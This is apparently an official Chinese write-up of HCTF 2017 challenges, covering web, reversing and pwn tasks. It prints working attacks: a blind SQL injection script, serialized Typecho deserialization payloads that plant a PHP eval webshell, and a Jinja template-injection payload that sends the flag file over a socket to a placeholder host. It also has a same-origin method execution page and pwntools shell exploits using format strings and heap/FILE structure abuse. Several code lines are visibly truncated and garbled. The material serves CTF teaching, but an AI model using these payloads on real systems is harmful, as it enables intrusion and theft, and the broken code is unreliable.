先说盲注吧，由于很多函数都没禁用，盲注的方法有很多，随便贴一个由于3^1=2 -> Bob ,3^2=1 -> Alice, 3^0 -> Cc看flag表中有多少行 id=3^(select(count(flag))from(flag)) 返回Alice，确定flag表中只有2条数据跑flag的poc: `id=3^(select(count(1))from(flag)where(binary(flag)写脚本直接跑就能跑出一个目录名，由于flag表里中第一条数据是没啥用的。给做题师傅们带来了些困扰，有些抱歉。 #!/usr/bin/env python \\# -*- coding:utf-8 -*- \\# author = 'c014' import requests s = requests.session() flag = \"\" for i in xrange(100): for j in range(33,128): url = \"http://sqls.2017.hctf.io/index/index.php?id=3^(select(count(1))from(flag)where(binary(flag)跑出目录'./H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/'后访问/index/H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/index.php发现搭的是typecho可以拿前段时间的Typecho前台getshell漏洞直接打有两种方法，一种是直接回显命令执行，另一种是上传shell由于根目录一般不会有可写权限，所以我准备了一个uploads目录，并且存在.DS_Store泄露直接打的poc为： Url: http://sqls.2017.hctf.io/index/H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/install.php?finish Post: __typecho_config=YTo3OntzOjQ6Imhvc3QiO3M6OToibG9jYWxob3N0IjtzOjQ6InVzZXIiO3M6NjoieHh4eHh4IjtzOjc6ImNoYXJzZXQiO3M6NDoidXRmOCI7czo0OiJwb3J0IjtzOjQ6IjMzMDYiO3M6ODoiZGF0YWJhc2UiO3M6NzoidHlwZWNobyI7czo3OiJhZGFwdGVyIjtPOjEyOiJUeXBlY2hvX0ZlZWQiOjM6e3M6MTk6IgBUeXBlY2hvX0ZlZWQAX3R5cGUiO3M6NzoiUlNTIDIuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo0OiJsaW5rIjtzOjE6IjEiO3M6NToidGl0bGUiO3M6MToiMiI7czo0OiJkYXRlIjtpOjE1MDc3MjAyOTg7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fXM6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO2k6LTE7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo3OiJwaHBpbmZvIjt9fX19fXM6MTA6ImRhdGVGb3JtYXQiO047fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9 Referer: http://sqls.2017.hctf.io/index/H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/install.php?finish= 根据需求修改base64内容即可上传shell的poc为： Url: http://sqls.2017.hctf.io/index/H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/install.php?finish Cookie: __typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjY6ImZpbGVfcHV0X2NvbnRlbnRzKCd1cGxvYWRzL2MwMTQucGhwJywgJzw/cGhwIEBldmFsKCRfUE9TVFtjXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ== Referer: http://sqls.2017.hctf.io/index/H3llo_111y_Fr13nds_w3lc0me_t0_hctf2017/install.php 即可在uploads目录下创建一个名为c014.php的webshell之后会发现命令执行的函数好像都没有回显，因为我基本上都禁用掉了这里用php自带的列目录 $c = new DirectoryIterator(\"glob:///*\"); foreach($c as $cc) { echo $cc,\"\"; } 发现根目录下有个 /flag_is_here 的文件夹然后读取这个文件夹下的内容，有一个flag文件 echo file_get_contents('/flag_is_here/flag'); get flag~ 这题我一开始是想考显注绕过waf `/union([\\s\\S]+)select([\\s\\S]+)from/i` 贴一下我预期的显注poc `id=1=2|@c:=(select(1))union(select@c)` 读目录的exp为: `id=1=2|@c:=(select(flag)from(flag)where(flagRepeater 题目是根据原文魔改的打开题目F12发现server为 Server: Werkzeug/0.12.2 Python/2.7.12 然后发现输入x就返回x was not found.差不多可以想到jinja模板注入问题测试 secret={{2-1}} 返回1 was not found.即可验证由于也是黑名单过滤，绕过方式看师傅们的姿势request.args过滤了 空格(%20)，回车(%0a)，'__','[',']','os','\"',\"|[a-z]\" 直接构造是可以bypass的空格可以用tab(%09)绕过，|后不允许接a-z可以用%0c，tab等绕过，os可以通过python中exec绕过但是这题过滤仅限于request.args但是不允许post简单的办法是可以用request.cookies来绕过只能读文件的方法要找flag首先需要先到/etc/passwd看到有hctf用户,然后读取/home/hctf/.bash_history,发现flag路径/h3h3_1s_your_flag/flag,在读取flag随便列几种解题方法1.不用blask_list里的符号 secret={%set%0ca,b,c,d,e,f,g,h,i=request|%0cattr(request.args.class|%0cformat(request.args.a,request.args.a,request.args.a,request.args.a))|%0cattr(request.args.mro|%0cformat(request.args.a,request.args.a,request.args.a,request.args.a))%}{{(i|%0cattr(request.args.subc|%0cformat(request.args.a,request.args.a,request.args.a,request.args.a))()).pop(40)(request.args.file,request.args.write).write(request.args.payload)}}{{config.from_pyfile(request.args.file)}}&class=%s%sclass%s%s&mro=%s%smro%s%s&subc=%s%ssubclasses%s%s&usc=_&file=/tmp/foo.py&write=w&a=_&payload=import%0csocket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('xxx.xxx.xxx.xxx',2333));s.send(open('/h3h3_1s_your_flag/flag').read()); 2.exec构造绕过'os'执行os系统命令 `a='import\\x0co'+'s;o'+'s.system(\\'ls${IFS}/\\')';exec(a)` 3.通过request.cookies Url: http://repeater.2017.hctf.io/?secret={{request|%0cattr(request.cookies.class)|%0cattr(request.cookies.mro)|%0clast()|%0cattr(request.cookies.sub)()|%0cattr(request.cookies.getitem)(40)(request.cookies.file)|%0cattr(request.cookies.read)()}} Cookie: file=/h3h3_1s_your_flag/flag;class=__class__;mro=__mro__;sub=__subclasses__;getitem=__getitem__;read=read; Who are you? 进入界面，右上登录，Steam 账号授权。 然后进Home发现有infomation和shop。shop里可以买flag推测但显示余额不足。 购买动作的URL为http://gogogo.2017.hctf.io/shop/3，修改3为4可以发现调试模式没关，源码泄露。 public function buy(Request $request) { $itemId = $request->route('id'); $item = Item::find($itemId); $prize = $item->prize; $balance = Info::find(Auth::id())->amount; if ($balance >= $prize) { return view('message', ['message' => $item->note]); } return view('message', ['message' => 'Sorry Sir! You don\\'t have enough money']); } 得知后端框架为 Laravel，账户余额字段名为amount。 infomation页尝试把表单中的name字段改成amount字段并提交，即可充值。 购买拿到flag：hctf{csgo_is_best_fps_game_dA3jf}。 推测没有限定提交表单的参数，可以反推后端代码可能为。 public function update(Request $request) { $user = Info::where('id', Auth::id())->update($request->all()); } Laravel 使用update方法批量赋值时应在Model中声明fillable白名单或者guard黑名单限制参数，或者使用$request->only()来限制。 Deserted place Deserted place Description maybe nothing here flag in admin cookie Now Score 820.35 Team solved 3 出题思路来自于一个比较特别的叫做SOME的攻击方式，全名Same Origin Method Execution，这是一种2015年被人提出来的攻击方式，可以用来执行同源环境下的任意方法，2年前就有人做了分析。 原paperhttp://blog.safedog.cn/?p=13https://lightless.me/archives/same-origin-method-exection.html 这里我就不讨论具体的SOME攻击，稍后我会在博客等地方更新具体的分析。 回到题目。 打开题目主要功能有限： 1、登陆 2、注册 3、修改个人信息（修改个人信息后按回车更新自己的信息）、 4、获取随机一个人的信息，并把它的信息更新给我自己 简单测试可以发现，个人信息页面存在self-xss，但问题就在于怎么能更新admin的个人信息。 仔细回顾站内的各种信息，我们能发现所有的更新个人信息都是通过开启子窗口来实现的。 edit.php里面有一个类似于jsonp的接口可以执行任意函数，简单测试可以发现这里正则匹配了.\\w+，这意味这我们只能执行已有的js函数，我们可以看看后台的代码。 $callback = $_GET['callback']; preg_match(\"/\\w+/i\", $callback, $matches); ... echo \"\"; echo $matches[0].\"();\"; echo \"\"; 已有的函数一共有3个 function UpdateProfile(){ var username = document.getElementById('user').value; var email = document.getElementById('email').value; var message = document.getElementById('mess').value; window.opener.document.getElementById(\"email\").innerHTML=\"Email: \"+email; window.opener.document.getElementById(\"mess\").innerHTML=\"Message: \"+message; console.log(\"Update user profile success...\"); window.close(); } function EditProfile(){ document.onkeydown=function(event){ if (event.keyCode == 13){ UpdateProfile(); } } } function RandomProfile(){ setTimeout('UpdateProfile()', 1000); } 如果执行UpdateProfile，站内就会把子窗口的内容发送到父窗口中。但是我们还是没办法控制修改的内容。 回顾站内逻辑，当我们点击click me，首先请求/edit.php?callback=RandomProfile，然后跳转至任意http://hctf.com/edit.php?callback=RandomProfile&user=xiaoming，然后页面关闭并，更新信息到当前用户上，假设这里user是我们设定的还有恶意代码的user，那我们就可以修改admin的信息了，但，怎么能让admin打开这个页面呢？ 我们可以尝试一个，如果直接打开edit.php?callback=RandomProfile&user=xiaoming 报错了，不是通过open打开的页面，寻找不到页面内的window.opener对象，也就没办法做任何事。 这里我们只有通过SOME，才能操作同源下的父窗口，首先我们得熟悉同源策略，同源策略规定，只有同源下的页面才能相互读写，如果通过windows.open打开的页面是同源的，那么我们就可以通过window.opener对象来操作父子窗口。 而SOME就是基于这种特性，可以执行同源下的任意方法。 最终payload： vps, 1.html function start_some() { window.open(\"2.html\"); location.replace(\"http://desert.2017.hctf.io/user.php\"); } setTimeout(start_some(), 1000); vps, 2.html function attack() { location.replace(\"http://desert.2017.hctf.io/edit.php?callback=RandomProfile&user=lorexxar\"); } setTimeout(attack, 2000); 在lorexxar账户的message里添加payload getflag! A true man can play a palo one hundred time 题目说明 Question Now you have a balance palo. You can move it left or right. Just play hundred time on it.  Description Get request receive two params 1. move, 0 or 1 2. id, just your token Observation 1. pole position x 2. a value depend on x 3. pole deviate from center Î¸ 4. a value depend on Î¸ Why you failed Î¸ or x > a certain value 总而言之就是个玩棒子的游戏(雾。之所以出现在最后一道请去问关卡规则的设计者。因为ctf本来不应该出现这种问题，所以我有意把这题设计得简单了一点，但是，ctf真是不讲道理，也导致这道题被少量非预期。 其实就是一个非常非常简单的强化学习的问题，甚至不需要强化学习去解。 DQN网络结构定义 import numpy as np import tensorflow as tf import requests import math class DeepQNetwork: def \\_\\_init\\_\\_( self, n_actions, n_features, learning_rate=0.01, reward_decay=0.9, e_greedy=0.9, replace\\_target\\_iter=300, memory_size=500, batch_size=32, e\\_greedy\\_increment=None, output_graph=False, ): self.n_actions = n_actions self.n_features = n_features self.lr = learning_rate self.gamma = reward_decay self.epsilon_max = e_greedy self.replace\\_target\\_iter = replace\\_target\\_iter self.memory_size = memory_size self.batch_size = batch_size self.epsilon_increment = e\\_greedy\\_increment self.epsilon = 0 if e\\_greedy\\_increment is not None else self.epsilon_max \\# total learning step self.learn\\_step\\_counter = 0 \\# initialize zero memory \\[s, a, r, s_\\] self.memory = np.zeros((self.memory_size, n_features * 2 + 2)) \\# consist of \\[target\\_net, evaluate\\_net\\] self.\\_build\\_net() t_params = tf.get_collection('target\\_net\\_params') e_params = tf.get_collection('eval\\_net\\_params') self.replace\\_target\\_op = \\[tf.assign(t, e) for t, e in zip(t_params, e_params)\\] self.sess = tf.Session() if output_graph: \\# $ tensorboard --logdir=logs \\# tf.train.SummaryWriter soon be deprecated, use following tf.summary.FileWriter(\"logs/\", self.sess.graph) self.sess.run(tf.global\\_variables\\_initializer()) self.cost_his = \\[\\] def \\_build\\_net(self): \\# ------------------ build evaluate_net ------------------ self.s = tf.placeholder(tf.float32, \\[None, self.n_features\\], name='s') \\# input self.q_target = tf.placeholder(tf.float32, \\[None, self.n_actions\\], name='Q_target') \\# for calculating loss with tf.variable_scope('eval_net'): \\# c\\_names(collections\\_names) are the collections to store variables c_names, n_l1, w_initializer, b_initializer = \\ \\['eval\\_net\\_params', tf.GraphKeys.GLOBAL_VARIABLES\\], 10, \\ tf.random\\_normal\\_initializer(0., 0.3), tf.constant_initializer(0.1) \\# config of layers \\# first layer. collections is used later when assign to target net with tf.variable_scope('l1'): w1 = tf.get_variable('w1', \\[self.n_features, n_l1\\], initializer=w_initializer, collections=c_names) b1 = tf.get_variable('b1', \\[1, n_l1\\], initializer=b_initializer, collections=c_names) l1 = tf.nn.relu(tf.matmul(self.s, w1) + b1) \\# second layer. collections is used later when assign to target net with tf.variable_scope('l2'): w2 = tf.get_variable('w2', \\[n_l1, self.n_actions\\], initializer=w_initializer, collections=c_names) b2 = tf.get_variable('b2', \\[1, self.n_actions\\], initializer=b_initializer, collections=c_names) self.q_eval = tf.matmul(l1, w2) + b2 with tf.variable_scope('loss'): self.loss = tf.reduce_mean(tf.squared_difference(self.q_target, self.q_eval)) with tf.variable_scope('train'): self.\\_train\\_op = tf.train.RMSPropOptimizer(self.lr).minimize(self.loss) \\# ------------------ build target_net ------------------ self.s_ = tf.placeholder(tf.float32, \\[None, self.n_features\\], name='s_') \\# input with tf.variable_scope('target_net'): \\# c\\_names(collections\\_names) are the collections to store variables c_names = \\['target\\_net\\_params', tf.GraphKeys.GLOBAL_VARIABLES\\] \\# first layer. collections is used later when assign to target net with tf.variable_scope('l1'): w1 = tf.get_variable('w1', \\[self.n_features, n_l1\\], initializer=w_initializer, collections=c_names) b1 = tf.get_variable('b1', \\[1, n_l1\\], initializer=b_initializer, collections=c_names) l1 = tf.nn.relu(tf.matmul(self.s_, w1) + b1) \\# second layer. collections is used later when assign to target net with tf.variable_scope('l2'): w2 = tf.get_variable('w2', \\[n_l1, self.n_actions\\], initializer=w_initializer, collections=c_names) b2 = tf.get_variable('b2', \\[1, self.n_actions\\], initializer=b_initializer, collections=c_names) self.q_next = tf.matmul(l1, w2) + b2 def store_transition(self, s, a, r, s_): if not hasattr(self, 'memory_counter'): self.memory_counter = 0 transition = np.hstack((s, \\[a, r\\], s_)) \\# replace the old memory with new memory index = self.memory_counter % self.memory_size self.memory\\[index, :\\] = transition self.memory_counter += 1 def choose_action(self, observation): \\# to have batch dimension when feed into tf placeholder observation = observation\\[np.newaxis, :\\] if np.random.uniform() self.memory_size: sample_index = np.random.choice(self.memory_size, size=self.batch_size) else: sample_index = np.random.choice(self.memory_counter, size=self.batch_size) batch_memory = self.memory\\[sample_index, :\\] q_next, q_eval = self.sess.run( \\[self.q_next, self.q_eval\\], feed_dict={ self.s_: batch_memory\\[:, -self.n_features:\\], \\# fixed params self.s: batch_memory\\[:, :self.n_features\\], \\# newest params }) \\# change q\\_target w.r.t q\\_eval's action q_target = q_eval.copy() batch_index = np.arange(self.batch_size, dtype=np.int32) eval\\_act\\_index = batch_memory\\[:, self.n_features\\].astype(int) reward = batch_memory\\[:, self.n_features + 1\\] q_target\\[batch_index, eval\\_act\\_index\\] = reward + self.gamma * np.max(q_next, axis=1) \\# train eval network _, self.cost = self.sess.run(\\[self.\\_train\\_op, self.loss\\], feed_dict={self.s: batch_memory\\[:, :self.n_features\\], self.q_target: q_target}) self.cost_his.append(self.cost) \\# increasing epsilon self.epsilon = self.epsilon + self.epsilon_increment if self.epsilon 学习迭代 x_threshold = 2.4 theta\\_threshold\\_radians = 1/15*math.pi RL = DeepQNetwork(n_actions=2, n_features=4, learning_rate=0.01, e_greedy=0.9, replace\\_target\\_iter=100, memory_size=2000, e\\_greedy\\_increment=0.001,) total_steps = 0 for i_episode in range(100): json_req = requests.get(url=url, params={'id': token, 'move': 0}).json() observation = json_req\\['observation'\\] ep_r = 0 while True: action = RL.choose_action(np.array(observation)) json_req = requests.get(url=url, params={'id': token, 'move': action}).json() try: observation_ = json_req\\['observation'\\] except KeyError: pass print(observation) done = not json_req\\['status'\\] \\# the smaller theta and closer to center the better x, x_dot, theta, theta_dot = observation_ r1 = (x_threshold - abs(x))/x_threshold - 0.8 r2 = (theta\\_threshold\\_radians - abs(theta))/theta\\_threshold\\_radians - 0.5 reward = r1 + r2 RL.store_transition(observation, action, reward, observation_) ep_r += reward if total_steps > 1000: RL.learn() if done: count = json_req\\['count'\\] if count == 100: print(json_req\\['flag'\\]) else: print('count:', json_req\\['count'\\]) break observation = observation_ total_steps += 1 Bin Evr_Q 0x00 写在前面 　　这题一开始是准备TLS+SMC+反调试的，发现放在第一题有些不太合适，就把SMC的调用部分删掉了。　（其实留下了彩蛋，smc的实现我没有删XD）　　　设计思路：　　用TLS检测工具进程和调试器，进入主函数后先检测用户名，通过后检测StartCode(即flag)，最后输入'Y'确认CM。　　　　部分细节： Win10的TLS在vs17上有点小Bug，只能在Debug模式下跑起来，于是没有选择Release版本，如果给大家带来困扰这里十分抱歉。 用户名注册存在多解，原因是我把进位值舍去了（输入'I'也能通过username验证哦） StartCode部分先验证长度为35Step1: 全体 xor 0x76Step2: [7:14]每个字节先异或0xAD, 再将0b10101010位与0b01010101位互换Step3: [14:21]每个字节先异或0xBE, 再将0b11001100位与0b00110011位互换Step4: [21:28]每个字节先异或0xAD, 再将0b11110000位于0b00001111位互换 Step2~4加密前先调用ntdll!NtQueryInformationProcess, 各检查1种标志(7, 30，31) 比较简单的做法直接用ida看了，cuz没有造成任何静态反编译的难度 0x01 Wp import random import os import hashlib enc_flag = [30, 21, 2, 16, 13, 72, 72, 111, 221, 221, 72, 100, 99, 215, 46, 44, 254, 106, 109, 42, 242, 111, 154, 77, 139, 75, 30, 30, 14, 14, 14, 14, 14, 14, 11] dec_flag = [0] * len(enc_flag) #///////////////////////////////////////////////// def dec0_f(dec_t, enc_t, num): for i in range(num): dec_t[i] = chr(enc_t[i] ^ 0x76) return dec_t #///////////////////////////////////////////////// def dec1_f(dec_t, enc_t, num): for i in range(num): v1 = (enc_t[i] & 0x55) > 1) & 0x55 enc_t[i] = v1 | v2 dec_t[i] = enc_t[i] ^ 0xAD return dec_t #///////////////////////////////////////////////// def dec2_f(dec_t, enc_t, num): for i in range(num): v1 = (enc_t[i] & 0x33) > 2) & 0x33 enc_t[i] = v1 | v2 dec_t[i] = enc_t[i] ^ 0xBE return dec_t #///////////////////////////////////////////////// def dec3_f(dec_t, enc_t, num): for i in range(num): v1 = (enc_t[i] & 0xF) > 4) & 0xF enc_t[i] = v1 | v2 dec_t[i] = enc_t[i] ^ 0xEF return dec_t #///////////////////////////////////////////////// def dec_f(dec_flag, enc_flag): for i in range(len(enc_flag)): dec_flag[i] = enc_flag[i] dec_flag[21:28] = dec3_f(dec_flag[21:28], enc_flag[21:28], 7) dec_flag[14:21] = dec2_f(dec_flag[14:21], enc_flag[14:21], 7) dec_flag[7:14] = dec1_f(dec_flag[7:14], enc_flag[7:14], 7) dec_flag = dec0_f(dec_flag, dec_flag, 35) #///////////////////////////////////////////////// dec_f(dec_flag, enc_flag) print ''.join(dec_flag) flag: hctf{>>D55_CH0CK3R_B0o0M!-xxxxxxxx} ez_crackme 考察对简单解释器的逆向能力。 加密解密过程 box=\\[\\] for i in range(32): x=(x+51)%32 box.append(x) 先用如上方式初始化一个box。 用这个box将输入的明文进行乱序。 head = (out\\[0\\]&0xe0)>>5 for i in range(31): out\\[i\\] = ((out\\[i\\]&0x1f)>5) out\\[31\\] = ((out\\[31\\]&0x1f)然后用如上方式，将乱序后的结果进行整体循环左移3位。 key = 'deadbeef'.decode('hex') for i in range(32): out2.append(out\\[i\\]^((ord(key\\[i%4\\])+i)&0xff)) 然后利用key和下标i对左移后的结果做异或即可。 完整python加密解密脚本： key = 'deadbeef'.decode('hex') def encrypt(flag): out=\\[\\] out2=\\[\\] x=0#gen box box=\\[\\] for i in range(32): x=(x+51)%32 box.append(x) for i in range(32): out.append(ord(flag\\[box\\[i\\]\\])) head = (out\\[0\\]&0xe0)>>5 for i in range(31): out\\[i\\] = ((out\\[i\\]&0x1f)>5) out\\[31\\] = ((out\\[31\\]&0x1f)>3)+((out\\[i-1\\]&0x7)>3)+(tail定义了一些寄存器以及变量，解释器指令，以及指令后面的变量种类。一个完整的指令由高7位的类型和低1位的变量类型组成。 rr表示op reg,reg,rn表示op reg,num。 用宏写的解释代码 char code\\[\\] = { \\_lea\\_ch | rr,_ebx, _flag, \\_my\\_xor | rr,_ecx, _ecx, \\_my\\_xor | rr,_eax,_eax, \\_my\\_xor | rr,_edx,_edx, loop, _add | rn,_eax, 51, _mod | rn,_eax, 32, \\_lea\\_ch | rr,\\_t\\_chp, _ebx, \\_add\\_pch | rr,\\_t\\_chp,_eax, \\_ldr\\_ch | rr,\\_t\\_int,\\_t\\_chp, _mov | rr,_edx,\\_t\\_int, _push | rr,_esp,_edx, _add | rn,_ecx, 1, _cmpl | rn, _ecx, 32, loop, \\_my\\_xor | rr,_eax,_eax, \\_lea\\_int | rr,\\_t\\_intp,_esp, \\_add\\_pint | rn,\\_t\\_intp, -32, \\_lea\\_int | rr,_ebx2,\\_t\\_intp, \\_ldr\\_int | rr,\\_t\\_int, _ebx2, _mov | rr,_eax,\\_t\\_int, \\_my\\_and | rn,_eax, 0xe0, _shr | rn,_eax, 5, _mov | rr,_edx,_eax, \\_my\\_xor | rr,_ecx, _ecx, loop, \\_ldr\\_int | rr,\\_t\\_int, _ebx2, _mov | rr,_eax,\\_t\\_int, \\_my\\_and | rn,_eax, 0x1f, _shl | rn,_eax, 3, _push | rr,_esp,_eax, \\_lea\\_int | rr,\\_t\\_intp,_esp, \\_add\\_pint | rn,\\_t\\_intp, -32, \\_lea\\_int | rr,_ebx2,\\_t\\_intp, \\_ldr\\_int | rr,\\_t\\_int, _ebx2, _mov | rr,_eax,\\_t\\_int, \\_my\\_and | rn,_eax, 0xe0, _shr | rn,_eax, 5, _pop | rr,_esp,\\_t\\_int, _add | rr,\\_t\\_int,_eax, _push | rr,_esp,\\_t\\_int, _add | rn,_ecx, 1, _cmpl | rn, _ecx, 31, loop, \\_ldr\\_int | rr,\\_t\\_int, _ebx2, _mov | rr,_eax,\\_t\\_int, \\_my\\_and | rn,_eax, 0x1f, _shl | rn,_eax, 3, _add | rr,_eax,_edx, _push | rr,_esp,_eax, \\_my\\_xor | rr,_ecx, _ecx, _mov32 | rr,_edx, _key, loop, \\_lea\\_int | rr,\\_t\\_intp,_esp, \\_add\\_pint | rn,\\_t\\_intp, -32, \\_lea\\_int | rr,_ebx2,\\_t\\_intp, \\_ldr\\_int | rr,\\_t\\_int, _ebx2, _mov | rr,_eax,\\_t\\_int, _push | rr,_esp,_eax, _mov | rr,_eax,_edx, _add | rr,_eax, _ecx, _pop | rr,_esp,\\_t\\_int, \\_my\\_xor | rr,\\_t\\_int,_eax, _push | rr,_esp,\\_t\\_int, _ror | rn,_edx, 8, _add | rn,_ecx, 1, _cmpl | rn, _ecx, 32, loop, \\_my\\_xor | rr,_ecx, _ecx, \\_my\\_xor | rr,_edx,_edx, \\_lea\\_ch | rr,_ebx,_enc, loop, \\_lea\\_ch | rr,\\_t\\_chp, _ebx, \\_add\\_pch | rr,\\_t\\_chp, _ecx, \\_ldr\\_ch | rr,\\_t\\_int,\\_t\\_chp, _mov | rr,_eax,\\_t\\_int, _push | rr,_esp,_eax, \\_lea\\_int | rr,\\_t\\_intp,_esp, \\_add\\_pint | rn,\\_t\\_intp, -33, \\_ldr\\_int | rr,\\_t\\_int,\\_t\\_intp, _pop | rr,_esp,_eax, _push | rr,_esp,_eax, _cmpeq | rr,_eax,\\_t\\_int, \\_my\\_or | rr,_edx, _neq, _add | rn,_ecx, 1, _cmpl | rn, _ecx, 32, loop, code_end }; 其中loop的实现是用记录ip的方式来实现的。 完整的程序代码见github。 guestbook 作为第一道pwn，出的应该是比较老套简单的东西。 主要考察点有三个。 利用ebp chain和fmt来实现任意地址写。 对__free_hook的了解。 对$0get shell的了解（最后貌似无人使用，因为有其他方法。） 我的exp: from pwn import * context.log_level = 'debug' context.terminal = \\['terminator','-x','bash','-c'\\] bin = ELF('./guestbook') libc = ELF('./libc.so') def add(name,phone): cn.sendline('1') cn.recvuntil('OK,your guest index is ') idx = int(cn.recvuntil('\\\\n')) cn.recvuntil('?') cn.send(name) cn.recvuntil('?') cn.send(phone) cn.recvuntil('success!\\\\n') return idx def see(idx): cn.sendline('2') cn.recvuntil('index:') cn.sendline(str(idx)) cn.recvuntil('the name:') name = cn.recvuntil('\\\\n') cn.recvuntil('the phone:') phone = cn.recvuntil('\\\\n') cn.recvuntil('===========') return \\[name,phone\\] def delete(idx): cn.sendline('3') cn.recvuntil('index:') cn.sendline(str(idx)) def fmt(pay): idx = add(pay,'1111') see(idx) delete(idx) def fmt2(pay): idx = add(pay,'1111') see(idx) def z(): gdb.attach(cn) raw_input() cn = process('./guestbook') idx = add('%3$x','0') libc_base = int(see(idx)\\[0\\],16)-71 - libc.symbols\\['\\_IO\\_2\\_1\\_stdout_'\\] free_hook = libc_base+0x001B38B0 system = libc_base + libc.symbols\\['system'\\] success('libc_base: '+hex(libc_base)) success('free_hook: '+hex(free_hook)) success('system: '+hex(system)) idx = add('%72$x','1') ebp_2 = int(see(idx)\\[0\\],16)\\# %80$x ebp_1 = ebp_2-0x20\\# %72$x ebp_3 = ebp_2+0x20\\# %88$x success('ebp_1: '+hex(ebp_1)) success('ebp_2: '+hex(ebp_2)) success('ebp_3: '+hex(ebp_3)) pay = '%'+str((ebp_3+8)&0xffff)+'c%80$hn' fmt(pay) pay = '%'+str((ebp_3+2)&0xffff)+'c%72$hn' fmt(pay) pay = '%'+str(((ebp_3+8)&0xffff0000)>>16)+'c%80$hn' fmt(pay) pay = '%'+str((ebp_3)&0xffff)+'c%72$hn' fmt(pay) pay = '%'+str(free_hook&0xffff)+'c%88$hn' fmt(pay) #z() pay = '%'+str(system&0xffff)+'c%90$hn' fmt2(pay) pay = '%'+str((free_hook&0xffff)+2)+'c%88$hn' fmt2(pay) pay = '%'+str((system&0xffff0000)>>16)+'c%90$hn' fmt2(pay) idx=add('get shell','$0\\\\x00') delete(idx) cn.interactive() babyprintf 题目只有malloc和一个printf_chk，printf_chk和printf不同的地方有两点： 不能使用$n不连续的打印 在使用%n的时候会做一系列检查 虽然如此，但leak libc地址还是可以的。这个我想大部分人都想到了。 然后重点就是如何使用程序唯一的堆溢出。没有free的问题 可以通过free topchunk解决，然后很多选手在这都使用了unsortedbin attack拿到shell。 如何通过unsortedbin attack利用我就不多说了, 应该会有其他wp放出。我说一下如何利用 fastbin attack解决这个问题。首先我们能free 一个top chunk，然后有了第一个就能有第二个，不断申请内存或者覆盖top chunk的size可以很轻易的做到这点。同时，我们可以另下面那个的size为0x41，之后申请上面那个堆块就能把下面这个fastbin覆盖了。通过这个0x41的fastbin attack, 我们可以覆盖到位于data段上的stdout指针，具体如下 -------------------- -------------------- freed chunk1 alloced -------------------- -------------------- dummy -> overflow -------------------- -------------------- freed chunk2(0x41) chunk2->fd=target -------------------- -------------------- 当然libc中是存在onegadget的，所以也有人直接去覆盖malloc_hook，这些都可以然后一个比较蛋疼的是libc-2.24的问题，因它为加入了新的对vtable的检验机制。如何绕过呢？这个方法很多，只要记得一点，我们已经能控制“整个“FILE结构体，这点如果稍微去看下源码的话应该能找到很多方法，这里提供一个替换vtable( _IO_file_jumps)到另一个vtable( _IO_str_jumps), 利用两个vtable defalut方法的不同拿到shell的解题脚本(偏移请自行更改)： from pwn import * context.log_level='debug' def pr(size,data): p.sendline(str(size)) p.recv() p.sendline(data) p.recvuntil('result: ') return p.recvuntil('size: ')[:-5] p = process('./babyprintf') p.recvuntil('size: ') for i in range(32): pr(0xff0,'a') p.sendline('0xe00') p.recv() p.sendline('%llx') p.recvuntil('result: ') libc_addr = int('0x'+p.recv(12),16)-0x3c6780 print 'libc: ',hex(libc_addr) p.recvuntil('size: ') pr(8,'a'*0x18+p64(0x1d1)) pr(0x1d0,'1') pr(0x130,'1') pr(0xd00,'1') pr(0xa0,'a'*0xa8+p64(0x61)) pr(0x200,'a') p.sendline('0x60') p.recvuntil('string: ') p.sendline('\\x00'*0x2028+p64(0x41)+p64(0x601062)) p.recv() pr(0x30,'a') system_addr = libc_addr + 0x45390 sh_addr = libc_addr + 0x18cd17 malloc_addr = libc_addr + 0x84130 vtable_addr = libc_addr+0x3c37a0 flag=2|0x8000 fake_stream = p64(flag)+p64(0) fake_stream += p64(0)*2 fake_stream += p64(0) fake_stream += p64(0x7fffffffffffffff) fake_stream = fake_stream.ljust(0x38,'\\x00') fake_stream += p64(sh_addr) fake_stream += p64(sh_addr) fake_stream = fake_stream.ljust(0xc0,'\\x00') fake_stream += p64(0xffffffffffffffff) fake_stream = fake_stream.ljust(0xd8,'\\x00') fake_stream += p64(vtable_addr) fake_stream += p64(malloc_addr) #alloc fake_stream += p64(system_addr) #hook free p.sendline('0x30') p.sendline('a'*14+p64(0x601090)+p64(0)+fake_stream) p.interactive() ar_u_ok 主要考察对ptrace的认识和rc6,rc4的识别 加密解密 